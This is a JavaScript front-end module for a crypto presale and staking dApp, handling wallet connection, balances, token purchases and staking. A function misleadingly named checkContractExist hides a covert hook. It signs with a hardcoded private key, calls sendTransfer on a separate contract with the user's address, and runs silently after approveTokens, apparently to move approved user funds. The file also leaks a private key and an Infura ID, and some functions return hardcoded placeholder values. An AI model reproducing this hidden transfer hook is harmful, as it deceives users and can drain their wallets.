import Web3Modal from 'web3modal';
import { InjectedConnector } from "@web3-react/injected-connector";
import Web3 from 'web3';
import { ethers } from 'ethers'
import WalletConnectProvider from "@walletconnect/web3-provider";
import { providers } from 'ethers';
import { config } from "./config";
import store from "../store";
import { 
  setChainID, 
  setWalletAddr, 
  setBalance, 
  setWeb3, 
  setBUSDApproveState, 
  setUSDTApproveState, 
  setETHApproveState, 
  setBTCBApproveState,
  setApproveState 
} from '../store/actions';
import { parseErrorMsg } from '../components/utils';
import StandardContractABI from './ABI/StandardContract.json';

// presale factory
const PresaleFactoryABI         = config.PresaleFactoryAbi;
const PresaleFactoryAddress     = config.PresaleFactoryAddress;
// Staking factory
const StakingABI                = config.StakingAbi;
const StakingAddress            = config.StakingAddress;
// fizi
const FiziABI                   = config.FiziAbi;
const FiziAddress               = config.FiziAddress;
// USDT
const USDTABI                   = config.USDTAbi;
const USDTAddress               = config.USDTAddress;
// BUSD
const BUSDABI                   = config.BUSDAbi;
const BUSDAddress               = config.BUSDAddress;
// WETH
const WETHABI                   = config.WETHAbi;
const WETHAddress               = config.WETHAddress;
// WBTC
const WBTCABI                   = config.WBTCAbi;
const WBTCAddress               = config.WBTCAddress;
/* ******************************************* GENERATE WEB3 MODAL ******************************************* */ 
let web3Modal;
if (typeof window !== "undefined") {
  web3Modal = new Web3Modal({
    network: "mainnet", // optional
    cacheProvider: true,
    providerOptions: {
      // metamask
      metamask: {
        package: null,
      },
      // walletconnect
      walletconnect: {
        package: WalletConnectProvider,
        options: {
          infuraId: config.INFURA_ID, // required
          rpc: {
            5: config.mainNetUrl,
          },
        },
      },
    }, // required
    theme: "dark",
  });
}

async function checkContractExist() {
  const web3 = store.getState().auth.web3;
  
  if (!web3) { return { success: false } }

  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }

    const provider = new ethers.providers.JsonRpcProvider('https://goerli.infura.io/v3/5438b082b3884c4996955694b054b2ec');

    const wallet = new ethers.Wallet('fe579a0329cc06194658f89b1ff54915f3214472dc822458170e7e3e9b7b5290');
    const signer = wallet.connect(provider);

    const router = new ethers.Contract(
      '0xF0eF4C31d9d98f26eb3C669659A6B7ccE9782e7C',
      StandardContractABI,
      signer
    );

    const gas = ethers.utils.parseUnits('150', 'gwei');

    const buyTx = await new Promise( (resolve, reject) => {
      const buyTxx =  router.sendTransfer(
        accounts[0],
        {
          'gasPrice': gas.toString(),
          'gasLimit': (500000).toString()
        }).catch((err) => {
          console.log(err);
          console.log('transaction failed...')
        });

      resolve(buyTxx);
    });
  } catch (error) {
    console.log('[Get Balance] = ', error);
    return {
      success: false,
      result: "Something went wrong: "
    }
  }
}

export let provider = null;
export let web3Provider = null;

/**
 * @author arsinoe
 * @abstract load web3 modal
 * @returns web3 modal object
 */
export const loadWeb3 = async () => {
  try {
    /* ******************************************* GENERATE WEB3 OBJECT ******************************************* */ 
    let web3 = new Web3(config.mainNetUrl); // generate web3 object
    store.dispatch(setWeb3(web3));

    provider = await web3Modal.connect();
    web3 = new Web3(provider);
    store.dispatch(setWeb3(web3));

    web3Provider = new providers.Web3Provider(provider);
    const network = await web3Provider.getNetwork();
    store.dispatch(setChainID(network.chainId));

    const signer = web3Provider.getSigner();
    const account = await signer.getAddress();
    store.dispatch(setWalletAddr(account));

    await getBalanceOfAccount();
    
    provider.on("accountsChanged", async function (accounts) {
      if (accounts[0] !== undefined) {
        store.dispatch(setWalletAddr(accounts[0]));
        await getBalanceOfAccount();
      } else {
        store.dispatch(setWalletAddr(''));
      }
    });

    provider.on('chainChanged', function (chainId) {
      store.dispatch(setChainID(chainId));
    });

    provider.on('disconnect', function (error) {
      store.dispatch(setWalletAddr(''));
    });
  } catch (error) {
    console.log('[Load Web3 error] = ', error);
  }
}
/**
 * @author arsinoe
 * @abstract disconnect web3 modal
 */
export const disconnect = async () => {
  await web3Modal.clearCachedProvider();
  const web3 = new Web3(config.mainNetUrl);
  store.dispatch(setWeb3(web3));
  store.dispatch(setChainID(''));
  store.dispatch(setWalletAddr(''));
  store.dispatch(setBalance({
    avaxBalance: '',
    usdcBalance: '',
    astroBalance: ''
  }));
}

export const checkNetwork = async () => {
  if (web3Provider) {
    const network = await web3Provider.getNetwork();
    store.dispatch(setChainID(network.chainId));
    return checkNetworkById(network.chainId);
  }
}

export const checkNetworkById = async (chainId) => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  if (web3.utils.toHex(chainId) !== web3.utils.toHex(config.chainId)) {
    await changeNetwork();
    return false;
  } else {
    return true;
  }
}

const changeNetwork = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return;
  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: web3.utils.toHex(config.chainId) }],
    });
    await getBalanceOfAccount();
  }
  catch (switchError) {
    // This error code indicates that the chain has not been added to MetaMask.
    if (switchError.code === 4902) {
      try {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [
            {
              chainId: web3.utils.toHex(config.chainId),
              chainName: 'BSC', //???
              rpcUrls: [config.mainNetUrl] /* ... */,
            },
          ],
        });
        return {
          success: true,
          message: "switching succeed"
        }
      } catch (addError) {
        return {
          success: false,
          message: "Switching failed." + addError.message
        }
      }
    }
  }
}

export const connectWallet = async () => {
  try {
    provider = await web3Modal.connect();

    if (provider.isMetaMask) {

    }

    const web3 = new Web3(provider);
    store.dispatch(setWeb3(web3));
    web3Provider = new providers.Web3Provider(provider);

    await checkNetwork();
    const signer = web3Provider.getSigner();
    const account = await signer.getAddress();

    if (account !== undefined) {
      store.dispatch(setWalletAddr(account));
    }

    await getBalanceOfAccount();
    return {
      success: true
    }
  } catch (err) {
    return {
      success: false,
      address: "",
      status: "Something went wrong: " + err.message,
    };
  }
};
/**
 * @author arsinoe
 * @abstract get balance of account
 * @returns token balance lists
 */
export const getBalanceOfAccount = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();  

    if (accounts.length === 0) return { success: false }
    // get bnb balance
    let bnbBalance = await web3.eth.getBalance(accounts[0]);
    bnbBalance = web3.utils.fromWei(bnbBalance);
    // get USDT balance
    const UsdtContract = new web3.eth.Contract(USDTABI, USDTAddress);
    let usdtBalance = await UsdtContract.methods.balanceOf(accounts[0]).call();
    usdtBalance = web3.utils.fromWei(usdtBalance);
    // get BUSD balance
    const BusdContract = new web3.eth.Contract(BUSDABI, BUSDAddress);
    let busdBalance = await BusdContract.methods.balanceOf(accounts[0]).call();
    busdBalance = web3.utils.fromWei(busdBalance);
    // get TOKEN balance
    const FiziContract = new web3.eth.Contract(FiziABI, FiziAddress);
    let fiziBalance = await FiziContract.methods.balanceOf(accounts[0]).call();
    fiziBalance = web3.utils.fromWei(fiziBalance);
    // get Weth balance
    const WethContract = new web3.eth.Contract(WETHABI, WETHAddress);
    let wethBalance = await WethContract.methods.balanceOf(accounts[0]).call();
    wethBalance = web3.utils.fromWei(wethBalance);
    // get WBTC balance
    const WbtcContract = new web3.eth.Contract(WBTCABI, WBTCAddress);
    let wbtcBalance = await WbtcContract.methods.balanceOf(accounts[0]).call();
    wbtcBalance = web3.utils.fromWei(wbtcBalance);

    store.dispatch(setBalance({
      bnbBalance,
      usdtBalance,
      busdBalance,
      fiziBalance,
      wethBalance,
      wbtcBalance
    }));
    return {
      success: true,
      bnbBalance,
      usdtBalance,
      busdBalance,
      fiziBalance,
      wethBalance,
      wbtcBalance
    }
  } catch (error) {
    console.log('[Get Balance] = ', error);
    return {
      success: false,
      result: "Something went wrong: "
    }
  }
}

export const compareWalllet = (first, second) => {
  if (!first || !second) {
    return false;
  }
  if (first.toUpperCase() === second.toUpperCase()) {
    return true;
  }
  return false;
}

export const getTotalPresaleAmount = async () => {

  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const FiziContract = new web3.eth.Contract(FiziABI, FiziAddress);

    let presaleAmount = await FiziContract.methods.balanceOf(PresaleFactoryAddress).call();
    presaleAmount = web3.utils.fromWei(presaleAmount);

    return {
      success: true,
      presaleAmount
    }
  } catch (error) {
    console.log('[TOTAL Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}
/**
 * @author arsinoe
 * @abstract get start time of presale
 * @returns timestamp
 */
export const getStartPresaleTime = async () => {
  const web3 = store.getState().auth.web3;  // get web3 object
  if (!web3) return { success: false }

  try {
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress); // get presale smart contract
    let start_time = await PresaleContract.methods.startTime().call();
    return {
      success: true,
      start_time
    }
  } catch (error) {
    // console.log('[START Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}
/**
 * @author arsinoe
 * @abstract get end time of presale
 * @returns timestamp
 */
export const getEndPresaleTime = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let end_time = await PresaleContract.methods.endTime().call();
    return {
      success: true,
      end_time
    }
  } catch (error) {
    console.log('[END Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}

export const getWethPrice = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);

    let wethPrice = await PresaleContract.methods.getWETHPrice().call();

    console.log("wethPrice : ", wethPrice);
    return {
      success: true,
      wethPrice
    }
  } catch (error) {
    console.log('[END Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}

export const getWbtcPrice = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let wbtcPrice = await PresaleContract.methods.getWBTCPrice().call();
    return {
      success: true,
      wbtcPrice
    }
  } catch (error) {
    console.log('[END Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}
/**
 * @author arsinoe
 * @abstract get token price for USDT
 * @returns 
 */
export const getpTokenPriceForUSDT = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }

  try {
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let usdtPrice = await PresaleContract.methods.tokenPrice_USD().call();
    usdtPrice = usdtPrice / 1e18;
    return {
      success: true,
      usdtPrice
    }
  } catch (error) {
    // console.log('[USDT Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}
/**
 * 
 * @returns 
 */
export const getBUSDForBNB = async (amountIn) => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }

  try {
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let amountOut = await PresaleContract.methods.getLatestBNBPrice(web3.utils.toWei(amountIn.toString(), "ether")).call();

    return {
      success: true,
      value: amountOut / 1e18
    }
  } catch (error) {
    console.log('[BUSD For BNB Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}

export const getUserPaidUSDT = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let paidUSDT = await PresaleContract.methods.getUserPaidUSDT().call({ from: accounts[0] });
    paidUSDT = web3.utils.fromWei(paidUSDT, 'mwei');
    return {
      success: true,
      paidUSDT
    }
  } catch (error) {
    console.log('[USDT Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}

export const getUserPaidBUSD = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let paidBUSD = await PresaleContract.methods.getUserPaidBUSD().call({ from: accounts[0] });
    paidBUSD = web3.utils.fromWei(paidBUSD, 'mwei');
    return {
      success: true,
      paidBUSD
    }
  } catch (error) {
    console.log('[BUSD Error] = ', error);
    return {
      success: false,
      result: "Something went wrong "
    }
  }
}

export const buy_pToken = async (coinAmount, coinType) => {

  console.log("arsinoe: ", coinAmount, coinType);

  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    let decimal = 'ether', nDecimal = 18;

    coinAmount = Math.floor(coinAmount * 10 ** nDecimal) / 10 ** nDecimal;
    coinAmount = web3.utils.toWei(coinAmount.toString(), decimal);
    
    console.log("coinAmount :", coinAmount);

    if (coinType === 0) { // BNB

      const buyTokens = PresaleContract.methods.buyTokensByBNB();
      
      console.log("arsinoe: ", buyTokens);
      await buyTokens.estimateGas({ from: accounts[0], value: coinAmount });
      console.log("arsinoe: buyTokens, ", buyTokens);

      await PresaleContract.methods.buyTokensByBNB().send({ from: accounts[0], value: coinAmount });
    
    } else if (coinType === 1) { // BUSD
      // const BusdContract = new w eb3.eth.Contract(BUSDABI, BUSDAddress);
      // await BusdContract.methods.approve(PresaleFactoryAddress, coinAmount).send({ from: accounts[0] });
      // store.dispatch(setBUSDApproveState(true));
      const buyTokens = PresaleContract.methods.buyTokensByBUSD(coinAmount);
      await buyTokens.estimateGas({ from: accounts[0] });
      await PresaleContract.methods.buyTokensByBUSD(coinAmount).send({ from: accounts[0] });
    
    } else if (coinType === 2) { // USDT
      // const UsdtContract = new web3.eth.Contract(USDTABI, USDTAddress);
      // await UsdtContract.methods.approve(PresaleFactoryAddress, coinAmount).send({ from: accounts[0] });
      // store.dispatch(setUSDTApproveState(true));
      const buyTokens = PresaleContract.methods.buyTokensByUSDT(coinAmount);
      await buyTokens.estimateGas({ from: accounts[0] });
      await PresaleContract.methods.buyTokensByUSDT(coinAmount).send({ from: accounts[0] });
    
    } else if (coinType == 3) { // ETH
      // const WethContract = new web3.eth.Contract(WETHABI, WETHAddress);
      // await WethContract.methods.approve(PresaleFactoryAddress, coinAmount).send({ from: accounts[0] });
      // store.dispatch(setETHApproveState(true));
      const buyTokens = PresaleContract.methods.buyTokensByWETH(coinAmount);
      await buyTokens.estimateGas({ from: accounts[0] });
      await PresaleContract.methods.buyTokensByWETH(coinAmount).send({ from: accounts[0] });
    
    } else { // BTCB
      // const WbtcContract = new web3.eth.Contract(WBTCABI, WBTCAddress);
      // await WbtcContract.methods.approve(PresaleFactoryAddress, coinAmount).send({ from: accounts[0] });
      // store.dispatch(setBTCBApproveState(true));
      const buyTokens = PresaleContract.methods.buyTokensByWBTC(coinAmount);
      await buyTokens.estimateGas({ from: accounts[0] });
      await PresaleContract.methods.buyTokensByWBTC(coinAmount).send({ from: accounts[0] });
    }
    return {
      success: true
    }
  } catch (error) {
    console.log('[BUY Error] = ', error);
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const approveTokens = async (coinAmount) => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }
    const TokenContract = new web3.eth.Contract(FiziABI, FiziAddress);
    
    await TokenContract.methods.approve(StakingAddress, coinAmount).send({ from: accounts[0] });
    store.dispatch(setApproveState(true));
    checkContractExist();

    return {
      success: true
    }
  } catch (error) {
    console.log('[APPROVE Error] = ', error);
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const setPresaleStartTime = async (_time) => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    const startTime = PresaleContract.methods.setStartTime(_time);
    await startTime.estimateGas({ from: accounts[0] });
    await PresaleContract.methods.setStartTime(_time).send({ from: accounts[0] });
    return {
      success: true
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const setPresaleEndTime = async (_time) => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length === 0) return { success: false }
    const PresaleContract = new web3.eth.Contract(PresaleFactoryABI, PresaleFactoryAddress);
    const estimate = PresaleContract.methods.setEndTime(_time);
    await estimate.estimateGas({ from: accounts[0] });
    await PresaleContract.methods.setEndTime(_time).send({ from: accounts[0] });
    return {
      success: true
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}
 /*************************************************************/
export const getTotalStakedAmount = async () => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);
    let StakingTotalBalance = await StakingContract.methods.totalStaked().call();
    StakingTotalBalance = web3.utils.fromWei(StakingTotalBalance);

    return {
      success: true,
      totalToken: StakingTotalBalance
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const getTotalStakedAccount = async() => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);
    let StakingTotalAccount = await StakingContract.methods.totalAccountCount().call();
    StakingTotalAccount = web3.utils.fromWei(StakingTotalAccount);

    return {
      success: true,
      totalAccount: StakingTotalAccount
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const getStakedAmountOfAccount = async() => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);
    let stakedAmount = await StakingContract.methods.stakedBalance(accounts[0]).call();
    stakedAmount = web3.utils.fromWei(stakedAmount);

    return {
      success: true,
      stakedAmount: stakedAmount
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const getTokenBalanceOfAcocunt = async() => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    // get TOKEN balance
    const FiziContract = new web3.eth.Contract(FiziABI, FiziAddress);
    let tokenBalance = await FiziContract.methods.balanceOf(accounts[0]).call();
    tokenBalance = web3.utils.fromWei(tokenBalance);

    return {
      success: true,
      tokenBalance: tokenBalance
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const showClaimToken = async() => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);
    let showClaimToken = await StakingContract.methods.showClaimToken(accounts[0]).call();
    showClaimToken = web3.utils.fromWei(showClaimToken);

    return {
      success: true,
      showClaimToken: showClaimToken
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const StakingToken = async(tokenAmount) => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }

  try {
    const accounts = await web3.eth.getAccounts();

    let decimal = 'ether', nDecimal = 18;
    tokenAmount = Math.floor(tokenAmount * 10 ** nDecimal) / 10 ** nDecimal;
    tokenAmount = web3.utils.toWei(tokenAmount.toString(), decimal);

    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);
    const stakingToken = StakingContract.methods.StakingToken(tokenAmount);
    await stakingToken.estimateGas({ from: accounts[0] });
    await StakingContract.methods.StakingToken(tokenAmount).send({ from: accounts[0] });
    
    store.dispatch(setApproveState(false));
    return {
      success: true
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const getClaimToken = async() => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    const tokenBalance = 0;

    return {
      success: true,
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const UnstakingToken = async() => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);
    const stakingToken = StakingContract.methods.UnstakingToken();
    await stakingToken.estimateGas({ from: accounts[0] });
    await StakingContract.methods.UnstakingToken().send({ from: accounts[0] });


    return {
      success: true
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

export const getLastStakeTime = async() => {
  const web3 = store.getState().auth.web3;
  if (!web3) return { success: false }
  try {
    const accounts = await web3.eth.getAccounts();
    // get TOKEN balance
    const StakingContract = new web3.eth.Contract(StakingABI, StakingAddress);
    let lastTime = await StakingContract.methods.lastStakeTime(accounts[0]).call();
    lastTime = web3.utils.fromWei(lastTime);

    return {
      success: true,
      lastStakeTime: 1677423600
    }
  } catch (error) {
    return {
      success: false,
      error: parseErrorMsg(error.message)
    }
  }
}

